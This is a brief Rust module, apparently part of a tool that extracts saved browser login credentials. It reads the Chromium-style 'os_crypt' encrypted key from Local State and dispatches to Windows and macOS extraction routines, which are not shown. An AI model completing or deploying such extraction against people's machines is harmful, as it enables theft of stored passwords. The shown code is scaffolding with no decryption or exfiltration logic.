use serde::Deserialize;

use crate::error::ExtractorResult;

use super::Credential;

#[cfg(target_os = "windows")]
mod win;

#[cfg(target_os = "macos")]
mod macos;

#[derive(Deserialize)]
pub struct LocalState {
    #[cfg(target_os = "windows")]
    pub os_crypt: OSCrypt,

    // TODO: Profile (at least on Windows) is nested under profiles.info_cache
}

#[cfg(target_os = "windows")]
#[derive(Deserialize)]
pub struct OSCrypt {
    pub encrypted_key: String,
}

pub fn login_credentials() -> ExtractorResult<Vec<Credential>> {
    #[cfg(target_os = "windows")]
    return win::login_credentials();

    #[cfg(target_os = "macos")]
    return macos::login_credentials();
}

pub(crate) fn browser_data() {

}
